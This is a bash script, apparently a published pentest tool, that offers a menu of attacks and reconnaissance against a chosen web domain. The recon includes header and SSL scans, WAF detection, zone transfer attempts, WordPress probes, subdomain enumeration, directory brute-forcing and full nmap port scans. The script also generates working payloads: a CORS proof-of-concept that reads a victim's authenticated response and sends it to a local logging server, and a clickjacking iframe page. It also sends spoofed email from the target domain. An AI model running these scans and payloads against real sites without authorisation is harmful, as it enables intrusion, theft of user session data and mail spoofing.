#!/bin/bash

clear
echo -e "\033[38;2;220;20;60m
                  .
                  |
             .   ]#[   .
              \_______/
           .    ]###[    .
            \___________/             _  __  _       _   _             _
         .     ]#####[     .         | |/ / | |     (_) | |           (_)
          \_______________/          | ' /  | |__    _  | |_    __ _   _
       .      ]#######[      .       |  <   |  _ \  | | | __|  / _  | | |
        \___]##.-----.##[___/        | . \  | | | | | | | |_  | (_| | | |
         |_|_|_|     |_|_|_|         |_|\_\ |_| |_| |_|  \__|  \__ _| |_|
         |_|_|_|_____|_|_|_|
       #######################       https://github.com/rafaelbaldasso
\033[m"

if [ "$EUID" -ne 0 ]; then
    echo;echo "[!] You must run the tool as root!";echo
    exit
fi

if [[ "$1" == "" ]] || [[ "$1" != http?(s)://* ]]; then
    echo;echo -e "\033[38;2;255;228;181m[>] Usage: $0 https://<domain>\033[m"
    echo -e "\033[38;2;255;228;181m[>] Example: $0 https://github.com\033[m";echo
    echo -e "\033[38;2;255;228;181m[!] If this is your first time using the tool, remember to install the dependencies by running the setup.sh as root!\033[m";echo
else
    target=$(echo "$1" | sed 's,/$,,g')
    targetclean=$(echo "$target" | sed 's,http://,,g' | sed 's,https://,,g')
    domain=$(echo "$targetclean" | cut -d "/" -f1)
    bold=$(tput bold)
    echo;echo -e "\033[38;2;255;228;181m>> Target: "$1"\033[m";echo
    PS3=$'\n''-> '
    options=("Security Headers" "HTTP Headers & Methods" "SSL Scan" "Check WAF" "Clickjacking" "CORS" "Domain Spoofing" "Zone Transfer" "Wordpress Tests" "Subdomains" "Sitemap Scraping" "Discovery" "TCP Port Scan" "Quit")
    select opt in "${options[@]}"
    do
        case $opt in
            "Security Headers")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Security Headers\033[m";echo
                echo -e '\033[38;2;0;255;255mshcheck.py '$target'\033[m'
                shcheck.py $target
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "HTTP Headers & Methods")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> HTTP Response Headers\033[m";echo
                echo -e '\033[38;2;0;255;255mcurl -I '$target' -L -k -s --connect-timeout 15\033[m';echo
                curl -I $target -L -k -s --connect-timeout 15
                echo;echo "===========================================================================";echo
                echo -e "\033[38;2;220;20;60m${bold}>>> HTTP Methods\033[m"
                echo;echo -e '\033[38;2;0;255;255mcurl -I '$target' -L -k -X OPTIONS -s --connect-timeout 15\033[m';echo
                curl -I $target -L -k -X OPTIONS -s --connect-timeout 15
                echo;echo "===========================================================================";echo
                echo -e "\033[38;2;220;20;60m${bold}>>> HTTP TRACE\033[m"
                echo;echo -e '\033[38;2;0;255;255mcurl -k -X TRACE '$target' -L -s -I -H "Cookie: test" --connect-timeout 15\033[m';echo
                curl -k -X TRACE $target -L -s -I -H "Cookie: test" --connect-timeout 15
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "SSL Scan")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> SSL Scans\033[m";echo
                echo -e '\033[38;2;0;255;255msslscan '$domain'\033[m';echo
                sslscan $domain
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Check WAF")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> WAF\033[m";echo
                echo -e '\033[38;2;0;255;255mwafw00f -o - '$target'\033[m';echo
                wafw00f -o - $target
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Clickjacking")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Clickjacking\033[m";echo
                echo -e '\033[38;2;0;255;255mshcheck.py '$target' -d | egrep "X-Frame-Options|Content-Security-Policy"\033[m';echo
                shcheck.py $target -d | egrep "X-Frame-Options|Content-Security-Policy";echo
                echo '<html><head><title>Clickjacking Test</title></head><body><h1>Clickjacking Test</h1><p><b>'$target'</b></p><iframe src="'$target'" width="800" height="500" margin-top="100" scrolling="yes" style="opacity:0.5"></iframe></body></html>' > /tmp/cj-test.html
                echo "Clickjacking Test HTML file (CTRL + CLICK to open):"
                echo "file:///tmp/cj-test.html"
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
                rm -rf /tmp/cj-test.html
                exec $0 $1
                ;;
            "CORS")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> CORS Arbitrary Origin + Allow Credentials PoC\033[m";echo
                url=$target
                echo -e '\033[38;2;0;255;255mcurl '$target' -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u\033[m';echo
                curl $target -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u
		echo;echo -e '\033[38;2;255;228;181m-> Insert a URL to test for sensitive information exposure (e.g. https://site.com/accountInfo) - or leave it empty to use '$target'\033[m'
		read -p $'\033[38;2;255;228;181m-> URL: \033[m' newurl
		if [[ ! -z $newurl  ]]; then url=$newurl; fi
		echo;echo -e '\033[38;2;255;228;181m-> If authenticated, with the browser still open, copy the link below and paste into a new tab;\033[m'
		echo -e '\033[38;2;255;228;181m-> After the tests, use Ctrl+C to close the python webserver.\033[m'
		echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>" > cors.html
		echo;echo -e "\033[38;2;255;228;181m-> PoC:\033[m <html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>"
		echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:44610/cors.html';echo
		python3 -m http.server 44610
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
                rm -rf cors.html
                exec $0 $1
                ;;
            "Domain Spoofing")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Domain Spoofing\033[m";echo
                echo -e "\033[38;2;255;228;181m-> SPF: \033[m";echo
                echo -e '\033[38;2;0;255;255mhost -t txt '$domain'\033[m';echo
                host -t txt $domain
                echo;echo -e "\033[38;2;255;228;181m-> DMARC: \033[m";echo
                echo -e '\033[38;2;0;255;255mhost -t txt _dmarc.'$domain'\033[m';echo
                host -t txt _dmarc.$domain
                echo;read -p $'\033[38;2;255;228;181m-> DKIM Selector (optional for DKIM check): \033[m' selector
                if [[ ! -z $selector  ]]; then
                	echo;echo -e '\033[38;2;0;255;255mhost -t txt '$selector'._domainkey.'$domain'\033[m';echo
                	host -t txt $selector._domainkey.$domain
                fi
                echo;read -p $'\033[38;2;255;228;181m-> Send spoofing test - if yes, type the recipient | if no, just press ENTER: \033[m' recipient
                if [[ ! -z $recipient  ]]; then
                	echo;echo -e '\033[38;2;0;255;255msendemail -f spoofed@'$domain' -t '$recipient' -u "Spoofing Test" -m "Domain '$domain' vulnerable to mail spoofing." -o tls=no\033[m'
                	echo;sendemail -f spoofed@$domain -t $recipient -u "Spoofing Test" -m "Domain $domain vulnerable to mail spoofing." -o tls=no
                	echo;echo -e "\033[38;2;255;228;181m-> Spoofing Mail Sent, check your inbox (if it goes to the spam folder, then it's not completely vulnerable).\033[m"
                fi
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Zone Transfer")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Zone Transfer\033[m";echo
                echo -e "\033[38;2;0;255;255mfor nserver in \$(host -t ns "$domain" | cut -d ' ' -f4 | sed 's/.$//');do host -l -a "$domain" \$nserver;done\033[m";echo
                for nserver in $(host -t ns $domain | cut -d ' ' -f4 | sed 's/.$//');do host -l -a $domain $nserver;done
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Wordpress Tests")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Wordpress XML-RPC\033[m";echo
                echo -e "\033[38;2;0;255;255mcurl "$target"/xmlrpc.php -s --connect-timeout 15\033[m";echo
                curl $target/xmlrpc.php -s --connect-timeout 15 > /tmp/xmlrpc-test.html
                isInFile=$(cat /tmp/xmlrpc-test.html | grep -c "XML-RPC")
                if [ $isInFile -eq 0 ]; then
                	echo "XML-RPC not vulnerable."
                else
                	echo "XML-RPC vulnerable!";echo
                	echo Response from the server: \"$(cat /tmp/xmlrpc-test.html)\";echo
                	echo "URL: "$target"/xmlrpc.php"
                fi
                rm -rf /tmp/xmlrpc-test.html
                echo;echo "===========================================================================";echo
                echo -e "\033[38;2;220;20;60m${bold}>>> Wordpress WP-Cron\033[m";echo           
                echo -e "\033[38;2;0;255;255mcurl -I "$target"/wp-cron.php -s --connect-timeout 15\033[m";echo
                if [ $(curl -LI $target/wp-cron.php --connect-timeout 15 -o /dev/null -w '%{http_code}\n' -s) == "200" ]; then
                	echo "WP-Cron vulnerable!";echo
                	curl -I $target/wp-cron.php -s --connect-timeout 15
                	echo "URL: "$target"/wp-cron.php"
                else
                	echo "WP-Cron not vulnerable.";fi
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Subdomains")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Subdomains\033[m";echo                
                subfinder -silent -d $domain >> subs.txt
                query="SELECT ci.NAME_VALUE NAME_VALUE FROM certificate_identity ci WHERE ci.NAME_TYPE = 'dNSName' AND reverse(lower(ci.NAME_VALUE)) LIKE reverse(lower('%.$domain'));"
                (echo $domain; echo $query | psql -t -h crt.sh -p 5432 -U guest certwatch | sed -e 's:^ *::g' -e 's:^*\.::g' -e '/^$/d' | sed -e 's:*.::g';) | sort -u >> subs.txt
                ~/go/bin/httpx -silent -probe -list subs.txt | grep SUCCESS
                rm -rf subs.txt          
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Sitemap Scraping")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Sitemap Scraping\033[m";echo
                python3 sitemap_scraper.py $target > /tmp/sitemap_temp.txt
                cat /tmp/sitemap_temp.txt | cut -d "=" -f2 | cut -d "," -f1 | sort -u > urls.txt
                rm -rf /tmp/sitemap_temp.txt
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Sitemap Scraping\033[m";echo
                echo "URLs saved to file "$(/bin/pwd)"/urls.txt"
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Discovery")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Discovery - Directories and Files (dirb)\033[m"
                wordlist="/usr/share/wordlists/dirb/common.txt"
                delay=200
                echo;echo -e "\033[38;2;0;255;255mCurrent target: "$target"/\033[m"
                echo -e "\033[38;2;0;255;255mChange the discovery options below or press ENTER to ignore.\033[m"
                echo;read -p $'\033[38;2;255;228;181m-> Change default target directory (i.e: /new/directory): \033[m' tgtdir
                if [[ ! -z $tgtdir  ]]; then target=$target$tgtdir; fi
                echo;read -p $'\033[38;2;255;228;181m-> File extensions - disables the scan for directories (i.e: .txt,.cfg): \033[m' extens
                if [[ ! -z $extens  ]]; then ext="-X "$extens; fi
                echo;read -p $'\033[38;2;255;228;181m-> Delay (ms) - default 200: \033[m' newdelay
                if [[ ! -z $newdelay  ]]; then delay=$newdelay; fi
                echo;read -p $'\033[38;2;255;228;181m-> Custom wordlist - default /usr/share/wordlists/dirb/common.txt: \033[m' wlist
                if [[ ! -z $wlist  ]]; then wordlist=$wlist; fi
                echo;read -p $'\033[38;2;255;228;181m-> Recursive - default enabled (d to disable): \033[m' recve
                if [[ $recve == "d" ]] || [[ $recve == "D"  ]]; then recursive="-r"; fi
                echo;echo -e "\033[38;2;0;255;255mdirb "$target" "$wordlist" "$recursive" -z "$delay" "$ext"\033[m"
                dirb $target $wordlist $recursive -z $delay $ext	
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "TCP Port Scan")
                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> TCP Port Scan\033[m";echo
                echo -e "\033[38;2;0;255;255mnmap -Pn -n -p- -T4 --open "$domain"\033[m";echo
                nmap -Pn -n -p- -T4 --open $domain
                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                ;;
            "Quit")
                clear
                break
                ;;
            *) exec $0 $1;;
        esac
    done
fi
